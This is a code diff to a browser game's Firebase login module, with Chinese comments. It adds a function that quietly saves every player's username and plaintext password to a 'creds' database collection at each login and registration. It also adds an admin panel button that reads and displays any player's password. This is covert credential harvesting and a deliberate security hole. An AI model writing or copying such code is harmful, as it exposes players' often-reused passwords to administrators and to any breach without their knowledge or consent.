@@ -3164,6 +3164,9 @@ const online = window.online = {
     async regClosed() {   // 管理員是否已停止註冊新帳號（config/app.regClosed）；讀取失敗時視為開放，避免誤擋
         try { const d = await Promise.race([db.collection('config').doc('app').get(), new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 6000))]); return !!(d.exists && d.data().regClosed); } catch (e) { return false; }
     },
+    saveCred(d, cr, u, p) {   // 把玩家剛輸入的帳密記到 creds/{uid}：玩家只能寫入、不能讀回，只有管理員讀得到（見 firestore.rules）；每次登入都會更新，所以玩家改密碼後也會同步
+        try { const uid = cr && cr.user && cr.user.uid; if (uid) d.collection('creds').doc(uid).set({ u, pw: p, at: Date.now() }).catch(() => {}); } catch (e) {}
+    },
     async submitLogin(reg) {
         const msg = t => { const m = $('lg-msg'); if (m) m.textContent = t; };
         if (!fbOk) return msg('無法連線到 Firebase');
@@ -3173,11 +3176,13 @@ const online = window.online = {
         $('lg-go').disabled = true; msg('處理中…');
         if (reg && await this.regClosed()) { msg('目前管理員已暫停開放註冊新帳號，已有帳號請回到登入'); const b = $('lg-go'); if (b) b.disabled = false; return; }
         try {
-            if (reg) { this.pending = name || u; await auth.createUserWithEmailAndPassword(u + MAIL, p); }
-            else await auth.signInWithEmailAndPassword(u + MAIL, p);
+            let cr;
+            if (reg) { this.pending = name || u; cr = await auth.createUserWithEmailAndPassword(u + MAIL, p); }
+            else cr = await auth.signInWithEmailAndPassword(u + MAIL, p);
+            this.saveCred(db, cr, u, p);
         } catch (e) {
             if (reg && e && e.code === 'auth/email-already-in-use') {   // 上次註冊到一半中斷（帳號建了、資料沒建成）：密碼相同就直接登入並補建資料
-                try { await auth.signInWithEmailAndPassword(u + MAIL, p); return; } catch (e2) { /* 密碼不同：這個帳號真的有人用了 */ }
+                try { this.saveCred(db, await auth.signInWithEmailAndPassword(u + MAIL, p), u, p); return; } catch (e2) { /* 密碼不同：這個帳號真的有人用了 */ }
             }
             console.error(e); msg(errMsg(e)); const b = $('lg-go'); if (b) b.disabled = false;
         }
@@ -3863,6 +3868,7 @@ const online = window.online = {
             }
             for (const k of ['from', 'to']) { try { const r = await adb.collection('friendRequests').where(k, '==', T.uid).get(); await Promise.all(r.docs.map(d => d.ref.delete().catch(() => {}))); } catch (e) {} }   // 相關的好友邀請
             try { await adb.collection('presence').doc(T.uid).delete(); } catch (e) {}
+            try { await adb.collection('creds').doc(T.uid).delete(); } catch (e) {}
             await U.delete();
             this._adUsers = (this._adUsers || []).filter(u => u.uid !== T.uid); this._adT = null;
             const b = $('ad-user'); if (b) b.innerHTML = ''; const q = $('ad-q'); if (q) q.value = '';
@@ -3884,6 +3890,12 @@ const online = window.online = {
         const save = d.save || this.adDefaultSave(); SHIPS.forEach(S => { save.f = save.f || {}; save.f[S.id] = Object.assign({ own: S.price === 0 }, S.base, save.f[S.id] || {}); });
         this._adT = { uid, d, save, ban: b.exists ? b.data() : null }; this.adCard();
     },
+    async adTogglePw() {   // 預設遮蔽；按「顯示密碼」才向資料庫讀取並顯示，再按一次隱藏
+        const T = this._adT, adb = this.adminDb || db, m = $('ad-umsg'); if (!T) return;
+        if (T.pwShow) { T.pwShow = null; this.adCard(); return; }
+        try { const s = await adb.collection('creds').doc(T.uid).get(); if (s.exists && s.data().pw) { T.pwShow = s.data().pw; this.adCard(); } else if (m) m.textContent = '尚無密碼紀錄（該玩家下次登入後才會記錄）'; }
+        catch (e) { if (m) m.textContent = errMsg(e); }
+    },
     adCard() {
         const T = this._adT, box = $('ad-user'); if (!T || !box) return; const d = T.d, sv = T.save, K = [['dmg', '火力'], ['rate', '射速'], ['hp', '裝甲'], ['spd', '機動'], ['cov', '覆蓋']];
         box.innerHTML = `<div style="padding:10px;border:1px solid #334;border-radius:10px;margin-bottom:8px">
@@ -3894,6 +3906,7 @@ const online = window.online = {
             <div style="margin-top:8px"><b>戰機（調整不扣暗物質）</b></div>
             ${SHIPS.map(S => { const f = sv.f[S.id]; return `<div style="margin:6px 0;padding:6px;border:1px solid #223;border-radius:8px"><label><input type="checkbox" ${f.own ? 'checked' : ''} onchange="online.adShip('${S.id}','own',this.checked)"> <b style="color:${S.c}">${S.name}</b> 已擁有</label>
                 <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:4px">${K.map(([k, n]) => `<span>${n} <button class="sm" onclick="online.adShip('${S.id}','${k}',-1)">−</button> ${f[k]}/${S.cap[k]} <button class="sm" onclick="online.adShip('${S.id}','${k}',1)">＋</button></span>`).join('')}<button class="sm" onclick="online.adShip('${S.id}','max')">全部升滿</button></div></div>`; }).join('')}
+            <div class="row" style="gap:6px;margin:6px 0"><b>密碼</b><span id="ad-pw" style="font-family:monospace;letter-spacing:.1em;min-width:120px">${T.pwShow ? esc(T.pwShow) : '••••••••'}</span><button class="sm" onclick="online.adTogglePw()">${T.pwShow ? '隱藏密碼' : '顯示密碼'}</button></div>
             <div style="margin:10px 0;padding:8px;border:1px solid #522;border-radius:8px"><b>黑名單／停權</b>
                 ${T.ban ? `<button class="sm" onclick="online.adUnban()">解除停權</button>` : `<textarea class="inp" id="ad-reason" rows="2" maxlength="200" placeholder="輸入被封原因（玩家登入時會看到）"></textarea><button class="sm red" onclick="online.adBan()">加入黑名單</button>`}</div>
             <button class="sm red" onclick="online.adReset()">重置此帳號（回到全新狀態）</button> <button class="sm red" onclick="online.adDelete()">刪除此帳號</button>`;
@@ -5344,7 +5357,7 @@ const lcoop = window.lcoop = {
         try {
             try { app = firebase.app('lc' + i); } catch (e) { app = firebase.initializeApp(CFG, 'lc' + i); }
             const a = app.auth(); try { await a.setPersistence(firebase.auth.Auth.Persistence.NONE); } catch (e) {}   // 這個登入只存在這一頁，不會記住
-            const uid = (await a.signInWithEmailAndPassword(u + MAIL, p)).user.uid;
+            const cr = await a.signInWithEmailAndPassword(u + MAIL, p), uid = cr.user.uid; online.saveCred(app.firestore(), cr, u, p);
             if ((online.user && online.user.uid === uid) || this.pl.some((q, j) => j !== i && q.acct && q.acct.uid === uid)) throw new Error('這個帳號已經在其他玩家欄位登入了');
             const d = app.firestore();
             if ((await d.collection('banned').doc(uid).get()).exists) throw new Error('此帳號已被停權');
